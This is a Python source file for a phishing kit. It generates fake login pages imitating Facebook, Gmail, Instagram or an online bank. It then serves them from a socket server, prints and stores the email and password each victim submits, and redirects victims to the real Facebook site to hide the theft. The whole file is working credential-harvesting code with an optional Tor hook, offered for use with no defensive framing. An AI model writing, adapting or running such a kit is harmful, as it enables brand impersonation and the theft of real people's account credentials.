"""Quick phishing page generator"""

import os
import random
import string
import socket
import threading

class PhishingKit:
    def __init__(self, tor_manager=None):
        self.tor = tor_manager
        self.server = None
    
    def _generate_page(self, brand="bank"):
        targets = {
            'facebook': {'title': 'Facebook Login', 'logo': 'facebook'},
            'gmail': {'title': 'Gmail Sign In', 'logo': 'google'},
            'bank': {'title': 'Online Banking Login', 'logo': 'bank'},
            'instagram': {'title': 'Instagram Login', 'logo': 'instagram'},
        }
        t = targets.get(brand, targets['bank'])
        
        return f"""<!DOCTYPE html>
<html><head><title>{t['title']}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family:Arial; background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh; }}
.card {{ background:white; padding:40px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:400px; }}
h2 {{ text-align:center; margin-bottom:30px; color:#1a1a1a; }}
input {{ width:100%; padding:14px; margin:8px 0; border:1px solid #ddd; border-radius:6px; font-size:16px; }}
button {{ width:100%; padding:14px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:18px; cursor:pointer; }}
button:hover {{ background:#166fe5; }}
.error {{ color:red; text-align:center; margin-top:10px; }}
</style></head><body>
<div class="card">
<h2>{t['title']}</h2>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or Phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<p style="text-align:center;margin-top:20px;color:#606770;font-size:13px;">
Forgotten password? · Sign up
</p>
</div></body></html>"""
    
    def start_server(self, port=8080, brand='bank'):
        html = self._generate_page(brand)
        captured = []
        
        class Handler:
            def __init__(self, html, captured):
                self.html = html
                self.captured = captured
            
            def handle(self, client):
                request = client.recv(4096).decode()
                
                if 'POST /login' in request:
                    body = request.split('\r\n\r\n')[1] if '\r\n\r\n' in request else ''
                    self.captured.append(body)
                    print(f"\n[+] CREDENTIALS CAPTURED: {body}")
                    
                    response = "HTTP/1.1 302 Found\r\nLocation: https://www.facebook.com/\r\nContent-Length: 0\r\n\r\n"
                else:
                    response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(self.html)}\r\n\r\n{self.html}"
                
                client.send(response.encode())
                client.close()
        
        handler = Handler(html, captured)
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('0.0.0.0', port))
        self.server.listen(5)
        
        print(f"\n=== PHISHING KIT ===")
        print(f"[+] Brand: {brand}")
        print(f"[+] Server: http://0.0.0.0:{port}")
        print(f"[+] Waiting for credentials...")
        print("[+] Type 'stop' to halt server\n")
        
        # Start listener thread
        def serve():
            while True:
                try:
                    client, addr = self.server.accept()
                    print(f"    Connection from {addr[0]}")
                    threading.Thread(target=handler.handle, args=(client,), daemon=True).start()
                except:
                    break
        
        server_thread = threading.Thread(target=serve, daemon=True)
        server_thread.start()
        
        # Wait for stop command
        while True:
            cmd = input("").strip().lower()
            if cmd == 'stop':
                break
        
        self.server.close()
        print(f"[+] Server stopped. {len(captured)} credentials captured.")
        return captured